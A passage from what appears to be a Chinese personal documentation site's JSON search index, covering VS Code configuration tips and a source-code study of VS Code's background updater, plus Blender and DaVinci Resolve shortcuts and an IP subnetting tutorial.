还是禁用吧.","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-vscode-Record-VSCode-and-RST-collaboration.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-vscode-Record-VSCode-and-RST-collaboration.html"},{"title":"记录一次vscode于rst协作的坑","text":"系统 macos 13 vscode 1.73.1 python 3.9.10 背景 今日看到野火的rst文档介绍, 发现使用了一样的vscode插件 reStructuredText . 但是我这边居然没有预览html的效果(无html样式, 只有空白的文字与普通样式). 处理 一开始以为有插件冲突, 去自己的已安装插件看了一下, 卸载了一些没用的插件, 无果. 于是网上冲浪, 无果 . 也去项目 release 看了, 说明了个寂寞. 最后看了一眼别人使用的版本, v155.0.0 , 去下载了这个版本的用, 居然就好了... 于是, 又试了较新的几个版本, 最开始是不行的, 后面可能是安装了推荐的插件, 最后使用最新版 v189.2.0 又可以了 暂时确定, 相关的有一个 esbonio 的 pip 包一定要有(vscode插件不用, 因为新版已内置),\n去看了官网文档, 确实要 ( reStructuredText v171之后的版本已经内置了这个插件, 所以可能启动的时候会有一些bug...) (简而言之就是某些配置存在问题, 通过降级后使用的时候触发了某些正确配置, 升级后就正常了) 结语 官网文档又不说, 项目的 release 介绍也没提, 坑... 最终解决 人都傻了, 知道什么原因了, 最新版默认使用的是 docutils 所以会有这个问题, 需要手动切换配置一下, 点击 vscode 左下角设置即可(打开rst文件才有) 另外, 有一个 No module named rstcheck.__main__;\n'rstcheck' is a package and cannot be directly executed 报错, 需要在 setting.json 里添加配置 \"restructuredtext.linter.rstcheck.executablePath\": \"rstcheck\" ,\n详情见 官网issuse 注解 相关的有一个 esbonio 的 pip 包, reStructuredText v171之后的版本默认使用 pip安装的了(没有的需要装)","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-vscode-Record-the-pits-of-VSCode-configuration-RST.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-vscode-Record-the-pits-of-VSCode-configuration-RST.html"},{"title":"vscode不同文件配置不同缩进","text":"Command + Shift + P 打开用户设置, 参考以下设置: \"[restructuredtext]\": {\n  // \"editor.detectIndentation\": false,\n  \"editor.tabSize\": 2,\n  \"editor.insertSpaces\": true,\n}, 一开始用的 rst 和 reStructuredText 都失败了.\n最后去setting.json联想输入才知道是 restructuredtext (小写)","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-vscode-VSCODE-different-file-configuration-different-indentation.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-vscode-VSCODE-different-file-configuration-different-indentation.html"},{"title":"vscode预定义变量","text":"预定义变量 支持下面的预定义变量: ${workspaceFolder} 当前工作目录(根目录) ${workspaceFolderBasename} 当前文件的父目录 ${file} 当前打开的文件名(完整路径) ${relativeFile} 当前根目录到当前打开文件的相对路径(包括文件名) ${relativeFileDirname} 当前根目录到当前打开文件的相对路径(不包括文件名) ${fileBasename} 当前打开的文件名(包括扩展名) ${fileBasenameNoExtension} 当前打开的文件名(不包括扩展名) ${fileDirname} 当前打开文件的目录 ${fileExtname} 当前打开文件的扩展名 ${cwd} 启动时task工作的目录 ${lineNumber} 当前激活文件所选行 ${selectedText} 当前激活文件中所选择的文本 ${execPath} vscode执行文件所在的目录 ${defaultBuildTask} 默认编译任务(build task)的名字","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-vscode-VSCode-predetermined-variable.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-vscode-VSCode-predetermined-variable.html"},{"title":"vscode设置等宽字体","text":"目前只找到两种字体: Inconsolata Ubuntu Mono: Ubuntu_Mono Inconsolata 比较优雅的等宽字体，支持高分辨率，是开源的 Google Fonts 字体. Inconsolata 字体下载地址(需要科学上网): Inconsolata#standard-styles 点击右上角的下载即可: 下载好后打开文件夹, 双击 ttf 即可安装. vscode中将 Editor: Font Family设置为Inconsolata: 最前面加上字体名称即可. 或者在 setting.json 加入(内容根据现有字体) \"editor.fontFamily\": \"'Inconsolata', Menlo, Monaco, 'Courier New', monospace\" 看起来是按照顺序来找字体的, 某个字符这个字体没有就看下个. 自己下载的: ../../../../resources/tar/Inconsolata.tar.gz Ubuntu Mono UbuntuMono的github 页面 下载这四个ttf文件: Ubuntu Mono derivative Powerline Bold Italic.ttf\nUbuntu Mono derivative Powerline Bold.ttf\nUbuntu Mono derivative Powerline Italic.ttf\nUbuntu Mono derivative Powerline.ttf vscode内设置一下即可: 'Ubuntu Mono derivative Powerline'","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-vscode-VSCode-settings-equal-wide-font.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-vscode-VSCode-settings-equal-wide-font.html"},{"title":"Vscode","text":"vscode vscode设置等宽字体 vscode不同文件配置不同缩进 记录vscode与rst协作 记录一次vscode配置rst的坑 Vscode预定义变量 实现探究: vscode-本地历史记录 vscode后台更新探究 MacOS下设置到环境变量 Shell Command => 安装到Path","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-vscode-index.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-vscode-index.html"},{"title":"vscode后台更新探究","text":"因为想像vscode一样实现应用的后台无感更新, 所以clone下来vscode源码研究了这一部分. 对于不同的系统版本, 实现的方式不同, 这里只讨论 windows 与 macos. linux看代码貌似没支持. 前置 源码:: microsoft/vscode vscode 事件, 组件等概念, 如果要介绍会导致篇幅太多, 故略过. 如果需要自己构建, 国内目前只看到这一篇说明清楚了: 打包VSCode源码为安装程序 , 其实源码仓库readme也有指引, 不过不是很明显. 笔者使用macos, 最开始直接run的时候没成功, 后面就没管这个直接看代码, 再后面才找到要怎么构建. 更新模块的主要源码都在 src/vs/platform/update yanque@yanquedembp vscode-code % tree src/vs/platform/update\nsrc/vs/platform/update\n├── common\n│   ├── update.config.contribution.ts\n│   ├── update.ts\n│   └── updateIpc.ts\n└── electron-main\n    ├── abstractUpdateService.ts\n    ├── updateService.darwin.ts\n    ├── updateService.linux.ts\n    ├── updateService.snap.ts\n    └── updateService.win32.ts\n\n2 directories, 8 files 对外提供的接口主要都放 common 目录下. electron-main 目录下是具体的实现. 在 electron-main 下, abstractUpdateService.ts 定义了抽象模版, 后面三个都是继承此类. updateService.darwin.ts 是针对 macos 的实现 updateService.linux.ts 是针对 linux 的实现 updateService.win32.ts 是针对 windows 的实现 abstractUpdateService 下 initialize() 定义了一个基础的判断更新逻辑, 检查用户配置的 update.mode 为 manual 表示手动更新, 退出执行 为 start 表示仅启动时候检查一次更新, 退出执行 其他值则定时检查更新. 设置的是每30s检查一次 源码: if (updateMode === 'manual') {\n    this.logService.info('update#ctor - manual checks only; automatic updates are disabled by user preference');\n    return;\n}\n\nif (updateMode === 'start') {\n    this.logService.info('update#ctor - startup checks only; automatic updates are disabled by user preference');\n\n    // Check for updates only once after 30 seconds\n    setTimeout(() => this.checkForUpdates(false), 30 * 1000);\n} else {\n    // Start checking for updates after 30 seconds\n    this.scheduleCheckForUpdates(30 * 1000).then(undefined, err => this.logService.error(err));\n} 经过几层调用后到了抽象类的 doCheckForUpdates() , 此抽象方法由上面提到的 updateService.darwin.ts 等具体实现. windows无感更新 实现方式依赖 inno setup , 官网文档: inno_setup_jrsoftware 只说结果, 如果支持快速更新, 则调用 build_process 的 spawn 执行类似于以下指令: VSCodeUserSetup-x64-1.76.0.exe /verysilent /update=VSCodeUserSetup-x64-1.76.0.flag /nocloseapplications /mergetasks=runcode,!desktopicon,!quicklaunchicon 其中 VSCodeUserSetup-x64-1.76.0.exe : 是下载好的安装包 /verysilent : 表示 强制静默安装，不管是否报错，都不会有任何提示 /update : vscode 自定义的参数. 见 update /nocloseapplications : 不关闭应用程序 其他: 字面意思, 任务都定义在仓库 build/win32/code.iss 下的 [Tasks] 部分(进此文件搜就看到了) 注解 真正支持后台更新的是 verysilent 与 /update /update 可以说是ts代码 与 iss 内定义脚本的一个交互. (还用了互斥锁, 不过具体实现我没看懂) 详情见: 后台更新 源码: const child = spawn(this.availableUpdate.packagePath, ['/verysilent', `/update=\"${this.availableUpdate.updateFilePath}\"`, '/nocloseapplications', '/mergetasks=runcode,!desktopicon,!quicklaunchicon'], {\n    detached: true,\n    stdio: ['ignore', 'ignore', 'ignore'],\n    windowsVerbatimArguments: true\n});\n\nchild.once('exit', () => {\n    this.availableUpdate = undefined;\n    this.setState(State.Idle(getUpdateType()));\n}); 这里的参数一般都是通用的, 除了 /update . 这一部分涉及到 innosetup 的 iss 配置文件定义, 可参考 官网文档: inno_setup_jrsoftware /update 是vscode 使用 innosetup 自定义的一个参数, 源码如下: // VS Code will create a flag file before the update starts (/update=C:\\foo\\bar)\n// - if the file exists at this point, the user quit Code before the update finished, so don't start Code after update\n// - otherwise, the user has accepted to apply the update and Code should start\nfunction LockFileExists(): Boolean;\nbegin\nResult := FileExists(ExpandConstant('{param:update}'))\nend;\n\nfunction ShouldRunAfterUpdate(): Boolean;\nbegin\nif IsBackgroundUpdate() then\n    Result := not LockFileExists()\nelse\n    Result := True;\nend; 启动部分代码如下: [Run]\nFilename: \"{app}\\{#ExeBasename}.exe\"; Description: \"{cm:LaunchProgram,{#NameLong}}\"; Tasks: runcode; Flags: nowait postinstall; Check: ShouldRunAfterUpdate\nFilename: \"{app}\\{#ExeBasename}.exe\"; Description: \"{cm:LaunchProgram,{#NameLong}}\"; Flags: nowait postinstall; Check: WizardNotSilent 结合上一部分, 能看出, 当 ShouldRunAfterUpdate 为 true (也就是安装程序后台启动静默安装且存在flag文件) 时,\n将会在用户退出出程序后, 自动打开. Task定义: [Tasks]\n// 省略...\nName: \"runcode\"; Description: \"{cm:RunAfter,{#NameShort}}\"; GroupDescription: \"{cm:Other}\"; Check: WizardSilent 可以看到, tasks 定义了 runcode 等任务, 看起来是执行什么, 不过没找到具体实现, 官网也没找到相关说明. 后台更新 补充, 后面再看了一下, 发现这部分之前认识有限, 真正支持后台更新的是 verysilent 与 /update . 而对于vscode来说, 真正有用的还是 /update . 不使用此参数时, 在vscode在允许的时候, 执行: VSCodeUserSetup-x64-1.76.0.exe /verysilent /nocloseapplications /mergetasks=runcode,!desktopicon,!quicklaunchicon 会弹出交互界面提示已经安装, 然后让你先退出. 在定义了 /update=VSCodeUserSetup-x64-1.76.0.flag 后,\n安装路径将不会安装在原来的 {app} 目录下, 而是暂时先安装到 {app}\\_ 下, 最后会触发 inno_updater.exe . inno_updater.exe 是微软自己做的一个更新工具, 源码地址: microsoft/inno-updater 而在 iss 配置的源码如下, 仅看关键代码 配置当存在flag文件时(即 使用了 /update ) // file 部分\n[Files]\nSource: \"*\"; Excludes: \"\\CodeSignSummary*.md,\\tools,\\tools\\*,\\appx,\\appx\\*,\\resources\\app\\product.json\"; DestDir: \"{code:GetDestDir}\"; Flags: ignoreversion recursesubdirs createallsubdirs\nSource: \"tools\\*\"; DestDir: \"{app}\\tools\"; Flags: ignoreversion\nSource: \"{#ProductJsonPath}\"; DestDir: \"{code:GetDestDir}\\resources\\app\"; Flags: ignoreversion\n\n// code 部分\nfunction GetDestDir(Value: string): string;\nbegin\nif IsBackgroundUpdate() then\n    Result := ExpandConstant('{app}\\_')\nelse\n    Result := ExpandConstant('{app}');\nend; 效果 后台安装到 _ 目录下 执行 inno_updater.exe procedure CurStepChanged(CurStep: TSetupStep);\nvar\nUpdateResultCode: Integer;\nbegin\nif IsBackgroundUpdate() and (CurStep = ssPostInstall) then\nbegin\n    CreateMutex('{#AppMutex}-ready');\n\n    while (CheckForMutexes('{#AppMutex}')) do\n    begin\n    Log('Application is still running, waiting');\n    Sleep(1000);\n    end;\n\n    // 此处执行\n    Exec(ExpandConstant('{app}\\tools\\inno_updater.exe'), ExpandConstant('\"{app}\\{#ExeBasename}.exe\" ' + BoolToStr(LockFileExists())), '', SW_SHOW, ewWaitUntilTerminated, UpdateResultCode);\nend;\nend; inno_updater 源码 可以去 microsoft/inno-updater clone下源码看 , 在 src/main.rs fn _main(log: &slog::Logger, args: &Vec<String>) -> Result<(), Box<dyn error::Error>> {\n\n    //省略非关键代码\n\n    let code_path = PathBuf::from(&args[1]);\n\n    //省略非关键代码\n\n    update(log, &code_path, \"_\", silent == \"true\")\n} 在 update 函数就指定了更新路径为 \"_\" 最后是通过删除文件, 并重命名的方式处理: fn move_update(\n    log: &slog::Logger,\n    uninstdat_path: &Path,\n    update_folder_name: &str,\n) -> Result<(), Box<dyn error::Error>> {\n\n    // 省略非关键部分\n\n    // safely delete all current files\n    delete_existing_version(log, root_path, update_folder_name)?;\n\n    // move update to current\n    for entry in fs::read_dir(&update_path)? {\n        let entry = entry?;\n        let entry_name = entry.file_name();\n        let entry_name = entry_name.to_str().ok_or(io::Error::new(\n            io::ErrorKind::Other,\n            \"Could not get entry name\",\n        ))?;\n\n        let mut target = PathBuf::from(root_path);\n        target.push(entry_name);\n\n        let msg = format!(\"Renaming: {:?}\", entry_name);\n        util::retry(\n            &msg,\n            |attempt| {\n                info!(log, \"Rename: {:?} (attempt {})\", entry_name, attempt);\n                fs::rename(entry.path(), &target)?;\n                Ok(())\n            },\n            None,\n        )?;\n    }\n\n    // 省略非关键部分\n\n} 将除 _ tools unins* appx 的目录/文件完全删除, 再从 _ 下重命名过去. 貌似还有版本检查的在vscode源码里面, 没细看. 多个进程协作-互斥量 更新补充以下互斥量相关. 更新过程与生命周期有两个互斥量参与: {#AppMutex}\n{#AppMutex}-ready 其中, 第一个 {#AppMutex} 主要用于生命周期结束时候的释放(就是vscode进程结束时候的释放),\n然后提示更新程序可以启动 inno_updater 进行更新. 创建 {#AppMutex} 及释放部分源码: private async installMutex(): Promise<void> {\n        const win32MutexName = this.productService.win32MutexName;\n        if (isWindows && win32MutexName) {\n                try {\n                        const WindowsMutex = await import('windows-mutex');\n                        const mutex = new WindowsMutex.Mutex(win32MutexName);\n                        once(this.lifecycleMainService.onWillShutdown)(() => mutex.release());\n                } catch (error) {\n                        this.logService.error(error);\n                }\n        }\n} 创建 {#AppMutex}-ready 源码(这个暂时没看到有释放的操作): procedure CurStepChanged(CurStep: TSetupStep);\nvar\n  UpdateResultCode: Integer;\nbegin\n  if IsBackgroundUpdate() and (CurStep = ssPostInstall) then\n  begin\n    CreateMutex('{#AppMutex}-ready');\n\n    while (CheckForMutexes('{#AppMutex}')) do\n    begin\n      Log('Application is still running, waiting');\n      Sleep(1000);\n    end;\n\n    Exec(ExpandConstant('{app}\\tools\\inno_updater.exe'), ExpandConstant('\"{app}\\{#ExeBasename}.exe\" ' + BoolToStr(LockFileExists())), '', SW_SHOW, ewWaitUntilTerminated, UpdateResultCode);\n  end;\nend; CreateMutex('{#AppMutex}-ready') 创建的互斥信号量 用于告知vscode已经临时安装结束 const readyMutexName = `${this.productService.win32MutexName}-ready`;\n      const mutex = await import('windows-mutex');\n\n// poll for mutex-ready\npollUntil(() => mutex.isActive(readyMutexName))\n  .then(() => this.setState(State.Ready(update))); pollUntil(() => mutex.isActive(readyMutexName)) 表示轮询检查 {#AppMutex}-ready 是否已经存在, 存在就表示已经临时安装到 _ 完成. macos无感更新 使用了 electron 下的 autoUpdater 模块. 官网说明: autoUpdater 应用其中部分: autoUpdater 对象具有以下方法 autoUpdater.setFeedURL(选项)​ 选项 对象 url string headers Record<string, string> (可选) macOS - HTTP 请求头。 serverType string(可选) macOS - 可以是json 或者 default,查看 Squirrel.Mac 的README文件获取更多详细信息。 设置检查更新的 url，并且初始化自动更新。 autoUpdater.getFeedURL()​ 返回 string - 获取当前更新的 Feed 链接. autoUpdater.checkForUpdates()​ 询问服务器是否有更新。 在使用此 API 之前，您必须调用setFeedURL 。 注意: 若更新可用将自动下载 调用 autoUpdater.checkForUpdates() 方法两次将下载更新两次 autoUpdater.quitAndInstall()​ 重启应用并在下载后安装更新。 它只应在发出 update-downloaded 后方可被调用。 在此机制下，调用 autoUpdater.quitAndInstall() 将首先关闭所有应用程序窗口，并且在所有窗口都关闭之后自动调用 app.quit() 注意: 严格来讲，执行一次自动更新不一定要调用此方法。因为下载更新文件成功之后，下次应用启动的时候会强制更新。 注解 一些当时搜到但是没时间看的文: 研究Electron自动更新 Electron AutoUpdater自动更新问题 linux 不支持, 检查更新后是跳转到浏览器下载的 猜测与想法 后台更新的功能, windows 专门自定义了工具 mac 使用 electron 的自动更新模块 linux 手动下载 至于为什么不全平台支持呢, 猜测可能有以下原因: linux权限控制问题 所以没有像使用压缩包解压复制的方式. 另外使用linux的群体, 大多都是同行吧, 让他/她们自己玩呗 electron 虽然支持了windows与mac, 但是估计有另外的需求, 或者是后面才支持的(不想去看提交历史, 后面有空补充) (electron 的自动更新, 具体怎么实现的我没有去看源码, 不做太多讨论) 是不是可以全平台支持? 使用下载压缩包的形式, 解压的临时目录然后移动. windows已经有exe的支持了, 下载压缩包还需要另外写工具, 得不偿失. 也可能就是不想支持吧 最后, windows就是微软自家产品, 自家产品当然要用自己的","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-vscode-vSCode-background-update-inquiry.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-vscode-vSCode-background-update-inquiry.html"},{"title":"vscode","text":"常用快捷键: ctrl + p                #按文件名搜索\nctrl + shift + f        #全局搜索指定文件夹内容\nctrl + f                #全局搜索当前打开文件内容\nctrl + shift + p        #全局打开文件 关于setting.json: {\n    // Git 可执行文件路径\n    \"git.path\": \"D:/Program Files/Git/bin/git.exe\"\n\n    ,\"editor.tabSize\": 4\n    ,\"editor.insertSpaces\": false\n    ,\"editor.useTabStops\": true\n\n    // 默认行尾字符。使用 \\n 表示 LF，\\r\\n 表示 CRLF。\n    ,\"files.eol\": \"\\n\"\n    // 控制编辑器在空白字符上显示特殊符号的方式。可选值为 \"none\"(无)、\"boundary\"(边界) 或 \"all\"(所有)。选择 \"boundary\" 选项，则不会在单词之间的单个空格上显示特殊符号。\n    ,\"editor.renderWhitespace\": \"all\"\n\n    // 去除shellcheck local的报错 In POSIX sh, 'local' is undefined\n    // local is supported in many shells, including bash, ksh, dash, and BusyBox ash. However, strictly speaking, it's not POSIX.\n    ,\"shellcheck.exclude\": [\"SC3043\"]\n} vscode插件离线安装 离线安装 在 vscode插件库 搜索自己需要的插件，点击右侧 Download Extension 然后将下载的文件，复制到vscode安装目录下的bin文件夹中 在bin文件夹下打开cmd，运行如下命令: code --install-extension octref.vuter-0.23.0.vsix     #需要安装的插件文件名 注解 vscode中可直接从visx安装插件 原文链接: https://blog.csdn.net/qq_26118603/article/details/115062440","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-vscode-vscode.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-vscode-vscode.html"},{"title":"vscode-本地历史记录","text":"vscode编辑器内置了本地文件历史记录的支持, 可以通过配置setting.json自定义,\n默认的配置如下: // 控制是否启用本地文件历史记录。启用后，所保存编辑器文件内容将存储到备份位置，以便稍后可以还原或查看内容。更改此设置不会影响现有本地文件历史记录条目。\n      \"workbench.localHistory.enabled\": true,\n\n      // 配置路径或 [glob 模式](https://aka.ms/vscode-glob-patterns)以排除本地文件历史记录中的文件。glob 模式的计算结果始终是相对于工作区文件夹路径所在的位置，除非它们是绝对路径。更改此设置不会影响现有的本地文件历史记录条目。\n      \"workbench.localHistory.exclude\": {},\n\n      // 控制每个文件的最大本地文件历史记录条目数。当文件的本地文件历史记录条目数超过此数目时，将丢弃最早的条目。\n      \"workbench.localHistory.maxFileEntries\": 50,\n\n      // 控制考虑用于本地历史记录的文件最大大小(KB)。较大的文件将不会添加到本地历史记录中。更改此设置不会影响现有本地文件历史记录条目。\n      \"workbench.localHistory.maxFileSize\": 256,\n\n      // 配置时间间隔(以秒为单位)，在此间隔期间，本地文件历史记录中的最后一个条目将替换为正在添加的条目。这有助于减少所添加的条目总数，例如启用自动保存时。此设置仅应用于具有相同源的条目。更改此设置不会影响现有本地文件历史记录条目。\n      \"workbench.localHistory.mergeWindow\": 10, 源码相关 历史文件是全拷贝到一个临时位置,\n临时位置跟据用户机器, 一般Windows默认是 $APPDATA/Roaming/Code/User/History 下面的每一个文件夹都是16进制的 源文件全路径的hash值(即每一个文件夹对应一个实际的文件),\n下面的每个条目表示每一次的记录全拷贝, 命名为: 四位随机数+后缀 对应关系在条目文件夹的 entries.json 内. 服务源码位置: src/vs/workbench/services/workingCopy/common/workingCopyHistoryService.ts","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-vscode-vscode-local-historical-record.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-vscode-vscode-local-historical-record.html"},{"title":"建模-Blender","text":"Blender 是一个开源免费的软件， 支持中文 快捷键-Win 功能 快捷键 场景位移 Shift + 鼠标中键 场景旋转 长按鼠标中键 场景缩放 滚动鼠标中键 物体位移 G (在此基础上点击XYZ，会沿着对应的轴线进行编辑； 或者叫 物体位移) 物体旋转 R (在此基础上点击XYZ，会沿着对应的轴线进行编辑) 物体缩放 S (在此基础上点击XYZ，会沿着对应的轴线进行编辑) 正视图 1 (小键盘数字，可以通过 编辑->偏好设置->输入->模拟数字键盘 开启上方数字键盘的支持， 针对没有小数字键盘的情况) 侧视图 3 (小键盘数字) 透视图 5 (小键盘数字) 顶视图 7 (小键盘数字) 物体最大化 .(小数字键盘， 需先选中物体) 独显 / (即单独显示某一个物体， 需先选中物体) 透显 Alt + Z (主要用于编辑时选择对象整体， 否则只能选择看到的这一面) 添加 Shift + A 模式选择 Ctrl + Tab(需先选中)， 比如编辑模式 倒角 Ctrl + B (为几何图形创建倒角或圆角。 倒角就是用来平滑边线或者拐角的) 循环切割 Ctrl + R 插入 I 挤压 E 封闭 F (一般用于选中边后封边) 沿法向挤出面 Alt + E 对象复制 Shift + G 全部视图同屏显示 Ctrl + Alt + Q (或者直接在左上角拖拽，再或者点击 新建窗口) 关联材质 Ctrl + L 其他说明: 默认模式下， 当开启 对象编辑 时， 1/2/3 的效果就是 点/线/面 的切换 当在编辑模式选择 线 时候， Alt + 单击 可以选择点击面的线条 摄像机视图 摄像机视图显示当前的场景，摄像机视图可以用来拍摄照片，并预览拍摄时场景的样子．\n渲染的图像将包含虚线内的所有内容。在这个视图中，您还可以设置呈现渲染区域它定呈的3D视图的部分 Shift + A 新建时候可选择 摄像机 N 可以锁定摄像机(或者在右上角进行属性设置) 放置好摄像机位置后， 可以按小键盘 0 进入摄像机视角 可在右上角设置一些相关属性 着色器 左上角下拉选择 着色器编辑器 渲染引擎 cycles是Blender中著名的渲染引擎，开源免费。\ncycles渲染器是基于物理算法的电影级别渲染器，正在被越来越多的好莱坞电影公司以及工作是作为首席渲染器使用 表面细分修改器 表面细分修改器用于将网格的面分割成更小的面, 使其看起来更平滑。它使您能够通过简单建模和低顶点网格创建复杂的光滑表面。 材质预览 右上角球形图标位置","tags":"剪辑","url":"/yq-docs-Chaotic-Editing-Modeling-Blener.html","loc":"/yq-docs-Chaotic-Editing-Modeling-Blener.html"},{"title":"图片格式转换","text":"方案一: 使用 convert 命令 使用 convert 命令, mac需要安装imagemagick (内置于此包命令): brew install imagemagick 缺点: 质量不高 方案二: sips mac自带, 质量较高 不过不支持转换为 svg ... 参考:: https://blog.csdn.net/qq_41437512/article/details/122619375","tags":"剪辑","url":"/yq-docs-Chaotic-Editing-Photo-format-conversion.html","loc":"/yq-docs-Chaotic-Editing-Photo-format-conversion.html"},{"title":"基础知识","text":"颜色三要素 色相 饱和度 亮度 素材分类 REC709 常规素材 RAW 原始素材 LOG 灰片素材(log函数转换信息) 设计... A卷文件: 主体素材, 如访谈时的主人公访谈素材 B卷文件: 相关主题素材, 如访谈时主人公相关介绍等","tags":"剪辑","url":"/yq-docs-Chaotic-Editing-Some-knowledge.html","loc":"/yq-docs-Chaotic-Editing-Some-knowledge.html"},{"title":"达芬奇","text":"系统: MAC 快捷操作 Command + P: 右键视频设置标志帧: 可以理解为设置图片封面 I: 标记入点 O: 标记出点, 跟上一个配合可以截取视频片段 Comand + +: Command加加号, 放大时间线 Comand + -: Command加减号, 缩小时间线, 与上一个可见于 时间线缩放 Shift + Z: 对当前时间线进行适配操作(尽量能看到更多时间线) F9: 插入视频片段 F10: 覆盖视频片段 F11: 替换视频片段, 与上两个注意 插入/覆盖/替换操作时注意 A: 选择模式, 可以拖动时间线的视频, 进行裁剪, 会替换裁减的视频帧为空白, 需手动删除此部分空白 T: 修剪编辑模式, 上一个的改进, 自动删除被裁减的视频帧(波纹修剪) ps: 从素材截取好片段后可以直接拖入时间线 播放快捷键(J, K, L): J: 倒放, 再按一次加速(可多次加速) K: 暂停播放 L: 快速播放, 再按一次加速(可多次加速) K + J: 逐帧向后播放 K + J(长按): 向后0.5倍速播放 K + L: 逐帧向前播放 K + L(长按): 向前0.5倍速播放 空格: 暂停/播放 +: 加号, 向前跳转指定时间(帧) -: 减号, 向后跳转指定时间(帧), 与上一个可见 跳转指定时间(帧) 软件相关概念 Master工作区 主工作区 达芬奇默认维护的一个工作区, 用来管理素材分类, 开在此部分下新建文件夹 Master工作区 时间线缩放 可以将正在操作的时间线放大缩小, 其实就是视频帧的更详细/更精简 时间线缩放 向前/后跳转指定时间(帧) 剪辑时候可以在选定的媒体库指定向前/后跳转指定时间(帧), 快捷键为在媒体时, 单击 +/- (单击加号或者减号), 加号向前, 减号向后 出现的框中输入格式:: 时:分:秒:帧 向前/后跳转指定时间(帧) J-Cat 有些视频, 先听到人物说话的声音, 再看到人. 实际应用相当于为一个场景配音. 插入/覆盖/替换操作时注意 当插入/覆盖/替换操作(F9/F10/F11)时, 注意音频是否需要覆盖 此处是否选中决定是否对音频进行操作","tags":"剪辑","url":"/yq-docs-Chaotic-Editing-da-Vinci.html","loc":"/yq-docs-Chaotic-Editing-da-Vinci.html"},{"title":"剪辑","text":"建模-Blender 达芬奇 一些知识 图片格式转换","tags":"剪辑","url":"/yq-docs-Chaotic-Editing-index.html","loc":"/yq-docs-Chaotic-Editing-index.html"},{"title":"IP地址与子网划分","text":"IP地址是一个 32位的二进制 地址，被分为4个8位段（八位组）。\n人们不习惯使用32的二进制地址或8位的二进制八位组，\n所以IP地址最常用的表达形式是 点分十进制 形式。 IP地址分类 IP地址中一部分是 网络ID ，另一部分是 主机ID ，\n地址分类系统把IP地址划分为不同的地址类： A类地址 ：IP地址的前 8 位表示网络ID，后24位表示主机ID B类地址 ：IP地址的前 16 位表示网络ID，后16位表示主机ID C类地址 ：IP地址的前 24 位表示网络ID，后8位表示主机ID 使用的位数越多，包含的组合就越多，可知A类地址较少的网络ID，\n但每个网络都具有大量的可用主机ID。 那计算机或路由器是如何将一个IP地址解释为A类、B类还是C类呢？ 其实二进制的前几位就是用来地址分类. 注解 D类地址，前4位为1110，用于多播（组播） E类地址，前5位为11110，实验性质的，不用于生产环境 排除地址 指的是 私有IP地址 ，用于本地局域网的IP地址分配 特殊的IP地址 全0 主机ID：表示 网络本身 ，如IP地址129.152.0.0是指网络ID为129.152的B类网络 全1 主机ID：表示 广播地址 ，如IP地址129.152.255.255是指网络ID为129.152的B类网络的广播地址 十进制 127开头 的地址： 环回地址 ，用于测试自身TCP/IP软件是否正常，如ping自己127.0.0.1 子网掩码 子网掩码是需要配合IP地址一起使用的，用于指示IP地址的前多少比特是网络ID，后多少比特是主机ID。 A、B、C类地址均有默认的掩码，也称固定掩码： 子网划分 子网划分是 从主机号字段借用若干位比特 ，\n把物理网络分解为更小的逻辑实体（称为子网）的一种手段，从而可以更加充分的利用有限的IP地址资源。 将初始网络分段，必须设计一种编址方案，\n能够识别出大型网络中的每个子网。一台特定主机可以通过以下三项被唯一识别： 网络号 唯一地指定主机所在网路（如果网络是公共互联网，网络号就是表示网络的地址，包括了其所有的子网） 子网号 唯一的指定了一个子网（初始网络内部的子网），一个子网内部包含若干主机 主机号 唯一地指定了子网内的某台主机 子网划分的几个步骤 确定需要的 子网个数 确定一个 子网内可能的最多主机数量 确定从主机号字段 借用的比特数 ，用于创建子网号字段 确定主机号字段需要 保留的比特数 （不能被子网字段借用的比特数） 确定 原始 网络号字段和主机号字段的比特数 检查以确保被借用的比特数 没有超过 被保留的比特数（即检查子网划分问题是可解的） 设置 子网号字段的最佳长度 ，包括为未来增长预留空间 创建一个修改（自定义）的 子网掩码 确定 有效的子网号 确定每个子网的 IP地址有效范围 子网划分举例 问题：有一个C类地址193.200.35.0，分配给某个组织，\n该组织需要两个子网，每个子网的主机数不会超过30台。 分析：子网数S=2，每个子网内最多的主机数H=30，C类地址的主机位比特T=8 确定 子网个数 ，S=2 确定一个 子网内可能的最多主机数量 ，H=30 求解2&#94;s - 2 >= S的最小整数s，解得s=2，即从主机号字段 借用的比特数 ，用于创建子网号字段 求解2&#94;h - 2 >= H的最小整数h，解得h=5，即主机号字段需要 保留的比特数 确定 原始 网络号字段和主机号字段的比特数，网络号字段为24，主机号字段T=8 因为s + h = 2 +5 =7 < 8，即借用的比特数 没有超过 被保留的比特数，问题可解 由于7 < 8，并且r = T - s - h = 1，因而可将 r分配给s或h，通常情况下子网的数量相比子网内主机的数量更容易耗尽，\n因而将r分配给s，即s = s + r = 2 + 1 =3，此时s + h = 3 + = 8 = T 创建一个自定义的 子网掩码 ，默认C类地址的子网掩码为255.255.255. 0 ，\n需要计算一个新值代替其0字节，计算256 - 2 &#94; (8 - s) = 256 - 2 &#94; 5 = 256 - 32 = 224（ 前s位全置为1，也就是前三位全置为1 ），\n所以自定义子网掩码为 255.255.255.224 确定 有效的子网号 ，运势网络地址为193.200.35. 0 ，将2 &#94; (8 - s)= 2 &#94; 5 = 32加到其0字节上，\n得到第一个子网的网络地址为193.200.35. 32 。继续在此字节上加上2 &#94; (8 - s)，\n直至其等于自定义的子网掩码，具体如下： 确定每个子网的 IP地址有效范围 ，先计算第一个子网，\n其地址为193.200.35. 33 ，\n所以其有效起始地址为193.200.35. 33 ，\n子网内可以有 2&#94;h - 